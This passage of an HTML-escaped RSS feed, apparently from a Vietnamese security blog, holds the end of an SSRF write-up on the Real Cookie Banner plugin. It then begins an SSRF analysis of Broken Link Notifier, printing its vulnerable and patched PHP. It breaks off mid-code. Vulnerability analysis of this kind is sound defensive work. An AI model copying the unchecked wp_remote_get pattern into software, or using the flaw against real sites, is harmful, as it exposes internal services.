ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/result.png&#39; alt=&#34;Result&#34; height=&#34;536&#34; width=&#34;1821&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;N·ªôi dung ƒë·ªçc ƒë∆∞·ª£c t·ª´ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;‚â§ 5.2.4&lt;/strong&gt; c·ªßa &lt;strong&gt;Real Cookie Banner&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;SSRF&lt;/strong&gt; t·∫°i endpoint &lt;code&gt;/wp-json/real-cookie-banner/v1/scanner/scan-without-login&lt;/code&gt;. H√†m &lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; nh·∫≠n &lt;code&gt;url&lt;/code&gt; t·ª´ client r·ªìi g·ªçi &lt;code&gt;wp_remote_get()&lt;/code&gt; v√† tr·∫£ v·ªÅ nguy√™n v·∫πn &lt;code&gt;body&lt;/code&gt;/&lt;code&gt;headers&lt;/code&gt;, cho ph√©p k·∫ª c√≥ quy·ªÅn Administrator (ho·∫∑c session admin b·ªã chi·∫øm) ƒë·ªçc/tra c·ª©u t√†i nguy√™n n·ªôi b·ªô. B·∫£n &lt;strong&gt;5.2.5&lt;/strong&gt; ƒë√£ th√™m ki·ªÉm tra domain (so s√°nh host v·ªõi domain c·ªßa job) ƒë·ªÉ ngƒÉn URL ngo√†i ph·∫°m vi v√† gi·∫£m nguy c∆°; vi·ªác chuy·ªÉn sang &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; v√† b·ªï sung ki·ªÉm tra b·ªï tr·ª£ l√† c·∫ßn thi·∫øt ƒë·ªÉ b·∫£o v·ªá t·ªët h∆°n.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;C·∫≠p nh·∫≠t plugin l√™n &lt;strong&gt;5.2.5+&lt;/strong&gt; ngay l·∫≠p t·ª©c.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng tin t∆∞·ªüng URL t·ª´ client ‚Äî validate/normalize v√† √°p allowlist domain tr∆∞·ªõc khi fetch.&lt;/li&gt;&#xA;&lt;li&gt;Ch·∫∑n request t·ªõi IP private/loopback sau khi resolve DNS (127.0.0.0/8, 10/8, 192.168/16, fc00::/7, v.v.).&lt;/li&gt;&#xA;&lt;li&gt;H·∫°n ch·∫ø quy·ªÅn g·ªçi endpoint; kh√¥ng c·∫•p cho t·∫•t c·∫£ user, tr√°nh &lt;code&gt;__return_true&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Tr√°nh forward credentials/cookies n·ªôi b·ªô; kh√¥ng tr·∫£ nguy√™n header/body th√¥ n·∫øu kh√¥ng c·∫ßn thi·∫øt.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; k·∫øt h·ª£p ki·ªÉm tra redirect, timeout, v√† SSL; log v√† gi·ªõi h·∫°n k√≠ch th∆∞·ªõc body tr∆∞·ªõc khi tr·∫£ v·ªÅ client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/real-cookie-banner/vulnerability/wordpress-real-cookie-banner-gdpr-eprivacy-cookie-consent-plugin-5-2-4-authenticated-admin-server-side-request-forgery-via-scan-without-login-endpoint-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Real Cookie Banner Plugin &amp;lt;= 5.2.4 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6851 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-28-cve-2025-6851/</link>
      <pubDate>Tue, 28 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-28-cve-2025-6851/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-28-cve-2025-6851/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Broken Link Notifier&lt;/strong&gt; cho WordPress b·ªã l·ªó h·ªïng &lt;strong&gt;Server‚ÄëSide Request Forgery&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;1.3.0&lt;/strong&gt; th√¥ng qua h√†m &lt;code&gt;ajax_blinks()&lt;/code&gt; v·ªën cu·ªëi c√πng g·ªçi h√†m &lt;code&gt;check_url_status_code()&lt;/code&gt;. ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;attacker ch∆∞a x√°c th·ª±c (unauthenticated attackers)&lt;/strong&gt; th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi b·∫•t k·ª≥ ƒë·ªãa ch·ªâ n√†o xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ ƒë∆∞·ª£c d√πng ƒë·ªÉ truy v·∫•n ho·∫∑c s·ª≠a ƒë·ªïi th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6851&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6851&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/broken-link-notifier/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Broken Link Notifier Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Broken Link Notifier&lt;/strong&gt;: &lt;strong&gt;1.3.0&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;1.3.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function check_url_status_code( $url, $timeout = null ) {&#xA;    // Add the home url&#xA;    if ( str_starts_with( $url, &amp;#39;/&amp;#39; ) ) {&#xA;        $link = home_url().$url;&#xA;    } else {&#xA;        $link = $url;&#xA;    }&#xA;    ...&#xA;&#xA;    // Check the link&#xA;    $response = wp_remote_get( $link, $http_request_args );&#xA;    if ( !is_wp_error( $response ) ) {&#xA;        $code = wp_remote_retrieve_response_code( $response );    &#xA;        $error = &amp;#39;Unknown&amp;#39;;&#xA;    } else {&#xA;        $code = 0;&#xA;        $error = $response-&amp;gt;get_error_message();&#xA;    }&#xA;} // End check_url_status_code&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, h√†m &lt;code&gt;check_url_status_code()&lt;/code&gt; th·ª±c hi·ªán vi·ªác g·ªçi &lt;code&gt;wp_remote_get()&lt;/code&gt; tr·ª±c ti·∫øp v·ªõi URL do ng∆∞·ªùi d√πng cung c·∫•p m√† kh√¥ng h·ªÅ ki·ªÉm tra t√≠nh h·ª£p l·ªá hay m·ª©c ƒë·ªô an to√†n c·ªßa URL. ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng &lt;strong&gt;SSRF (Server-Side Request Forgery)&lt;/strong&gt;. Phi√™n b·∫£n n√†y kh√¥ng ki·ªÉm tra scheme c·ªßa URL, host c√≥ h·ª£p l·ªá hay kh√¥ng, hay IP c√≥ thu·ªôc d·∫£i private/reserved, n√™n m·ªçi request ƒë·ªÅu ƒë∆∞·ª£c th·ª±c hi·ªán m√† kh√¥ng c√≥ h·∫°n ch·∫ø.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function check_url_status_code( $url, $timeout = null ) {&#xA;    // Add the home url&#xA;    if ( str_starts_with( $url, &amp;#39;/&amp;#39; ) ) {&#xA;        $link = home_url().$url;&#xA;    } else {&#xA;        $link = $url;&#xA;    }&#xA;    // Block SSRF to private/reserved ranges&#xA;    $unsafe = $this-&amp;gt;is_url_unsafe( $link );&#xA;    if ( $unsafe ) {&#xA;        return apply_filters( &amp;#39;blnotifier_status&amp;#39;, $unsafe );&#xA;    }&#xA;    ...&#xA;&#xA;    // Check the link&#xA;    $response = wp_remote_get( $link, $http_request_args );&#xA;    if ( !is_wp_error( $response ) ) {&#xA;        $code = wp_remote_retrieve_response_code( $response );    &#xA;        $error = &amp;#39;Unknown&amp;#39;;&#xA;    } else {&#xA;        $code = 0;&#xA;        $error = $response-&amp;gt;get_error_message();&#xA;    }&#xA;} // End check_url_status_code&#xA;&#xA;protected function is_url_unsafe( $url ) {&#xA;    $parts = wp_parse_url( $url );&#xA;&#xA;    if ( ! isset( $parts[ &amp;#39;scheme&amp;#39; ], $parts[ &amp;#39;host&amp;#39; ] ) ) {&#xA;        return [&#xA;            &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;            &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: invalid or malformed URL&amp;#39;,&#xA;            &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;        ];&#xA;    }&#xA;&#xA;    $scheme = strtolower( $parts[ &amp;#39;scheme&amp;#39; ] );&#xA;    if ( ! in_array( $scheme, [ &amp;#39;http&amp;#39;, &amp;#39;https&amp;#39; ], true ) ) {&#xA;        return [&#xA;            &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;            &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: unsupported URL scheme&amp;#39;,&#xA;            &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;        ];&#xA;    }&#xA;&#xA;    $host = $parts[ &amp;#39;host&amp;#39; ];&#xA;    $records = @dns_get_record( $host, DNS_A &amp;#43; DNS_AAAA );&#xA;    $ips = [];&#xA;&#xA;    if ( is_array( $records ) &amp;amp;&amp;amp; count( $records ) ) {&#xA;        foreach ( $records as $record ) {&#xA;            if ( isset( $record[ &amp;#39;type&amp;#39; ] ) &amp;amp;&amp;amp; $record[ &amp;#39;type&amp;#39; ] === &amp;#39;A&amp;#39; &amp;amp;&amp;amp; ! empty( $record[ &amp;#39;ip&amp;#39; ] ) ) {&#xA;                $ips[] = $record[ &amp;#39;ip&amp;#39; ];&#xA;            }&#xA;            if ( isset( $record[ &amp;#39;type&amp;#39; ] ) &amp;amp;&amp;amp; $record[ &amp;#39;type&amp;#39; ] === &amp;#39;AAAA&amp;#39; &amp;amp;&amp;amp; ! empty( $record[ &amp;#39;ipv6&amp;#39; ] ) ) {&#xA;                $ips[] = $record[ &amp;#39;ipv6&amp;#39; ];&#xA;            }&#xA;        }&#xA;    } else {&#xA;        $resolved = gethostbyname( $host );&#xA;        if ( $resolved &amp;amp;&amp;amp; $resolved !== $host ) {&#xA;            $ips[] = $resolved;&#xA;        }&#xA;    }&#xA;&#xA;    if ( empty( $ips ) ) {&#xA;        return [&#xA;            &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;            &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;            &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: host could not be resolved&amp;#39;,&#xA;            &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;        ];&#xA;    }&#xA;&#xA;    foreach ( $ips as $ip ) {&#xA;        if ( filter_var( $ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE ) === false ) {&#xA;            return [&#xA;                &amp;#39;type&amp;#39; =&amp;gt; &amp;#39;broken&amp;#39;,&#xA;                &amp;#39;code&amp;#39; =&amp;gt; 0,&#xA;                &amp;#39;text&amp;#39; =&amp;gt; &amp;#39;Blocked: resolved to internal or reserved IP address&amp;#39;,&#xA;                &amp;#39;link&amp;#39; =&amp;gt; $url&#xA;            ];&#xA;        }&#xA;    }&#xA;&#xA;    return false; // Safe&#xA;} // End is_url_unsafe()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ b·ªï sung h√†m &lt;code&gt;is_url_unsafe()&lt;/code&gt;. Tr∆∞·ªõc khi g·ªçi &lt;code&gt;wp_remote_get()&lt;/code&gt;, URL ƒë∆∞·ª£c ki·ªÉm tra chi ti·∫øt: ch·ªâ cho ph√©p scheme &lt;code&gt;http&lt;/code&gt; v√† &lt;code&gt;https&lt;/code&gt;, x√°c th·ª±c host h·ª£p l·ªá, th·ª±c hi·ªán resolve DNS ƒë·ªÉ l·∫•y IP v√† ch·∫∑n t·∫•t c·∫£ c√°c IP n·ªôi b·ªô ho·∫∑c thu·ªôc d·∫£i reserved. N·∫øu URL kh√¥ng h·ª£p l·ªá ho·∫∑c kh√¥ng an to√†n, h√†m s·∫Ω tr·∫£ v·ªÅ th√¥ng tin chi ti·∫øt v·ªÅ vi·ªác block v√† &lt;strong&gt;kh√¥ng th·ª±c hi·ªán request&lt;/strong&gt;, t·ª´ ƒë√≥ &lt;strong&gt;ngƒÉn ch·∫∑n SSRF hi·ªáu qu·∫£&lt;/strong&gt;. B·∫£n v√° ƒë·∫£m b·∫£o r·∫±ng ch·ªâ c√°c URL an to√†n m·ªõi ƒë∆∞·ª£c ph√©p g·ªçi, gi·∫£m thi·ªÉu r·ªßi ro t·∫•n c√¥ng t·ª´ b√™n ngo√†i.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function check_url_status_code( $url, $timeout = null ) {&#xA;    // Get the &amp;#39;allow_redirects&amp;#39; option and sanitize it&#xA;    $allow_redirects = filter_var( get_option( &amp;#39;blnotifier_allow_redirects&amp;#39; ), FILTER_VALIDATE_BOOLEAN );&#xA;&#xA;    // Determine the request method based on allow_redirects option&#xA;    $request_method = $allow_redirects ? &amp;#39;GET&amp;#39; : &amp;#39;HEAD&amp;#39;;&#xA;&#xA;    // Force giving head for images, videos, and audio files&#xA;    if ( $request_method == &amp;#39;GET&amp;#39; ) {&#xA;        $file_extension = strtolower( pathinfo( $url, PATHINFO_EXTENSION ) );&#xA;        if ( in_array( $file_extension, $this-&amp;gt;get_force_head_file_types() ) ) {&#xA;            $request_method = &amp;#39;HEAD&amp;#39;;&#xA;        }&#xA;    }&#xA;    &#xA;    // User agent&#xA;    $user_agent = $this-&amp;gt;get_user_agent( $url );&#xA;&#xA;    // Add the home url&#xA;    if ( str_starts_with( $url, &amp;#39;/&amp;#39; ) ) {&#xA;        $link = home_url().$url;&#xA;    } else {&#xA;        $link = $url;&#xA;    }&#xA;&#xA;    // Check if from youtube&#xA;    if ( $watch_url = $this-&amp;gt;is_youtube_link( $link ) ) {&#xA;        $link = &amp;#39;https://www.youtube.com/oembed?format=json&amp;amp;url=&amp;#39;.$watch_url;&#xA;    }&#xA;&#xA;    // The request args&#xA;    // See https://developer.wordpress.org/reference/classes/WP_Http/request/&#xA;    $http_request_args = apply_filters( &amp;#39;blnotifier_http_request_args&amp;#39;, [&#xA;        &amp;#39;method&amp;#39;      =&amp;gt; $request_method,&#xA;        &amp;#39;timeout&amp;#39;     =&amp;gt; $timeout,&#xA;        &amp;#39;redirection&amp;#39; =&amp;gt; absint( get_option( &amp;#39;blnotifier_max_redirects&amp;#39;, 5 ) ),&#xA;        &amp;#39;httpversion&amp;#39; =&amp;gt; &amp;#39;1.1&amp;#39;,&#xA;        &amp;#39;sslverify&amp;#39;   =&amp;gt; filter_var( get_option( &amp;#39;blnotifier_ssl_verify&amp;#39;, true ), FILTER_VALIDATE_BOOLEAN ),&#xA;        &amp;#39;user-agent&amp;#39;  =&amp;gt; $user_agent&#xA;    ], $url );&#xA;&#xA;    // Check the link&#xA;    $response = wp_remote_get( $link, $http_request_args );&#xA;    if ( !is_wp_error( $response ) ) {&#xA;        $code = wp_remote_retrieve_response_code( $response );    &#xA;        $error = &amp;#39;Unknown&amp;#39;;&#xA;    } else {&#xA;        $code = 0;&#xA;        $error = $response-&amp;gt;get_error_message();&#xA;    }&#xA;&#xA;    // Let&amp;#39;s make invalid URL 0 codes broken&#xA;    if ( 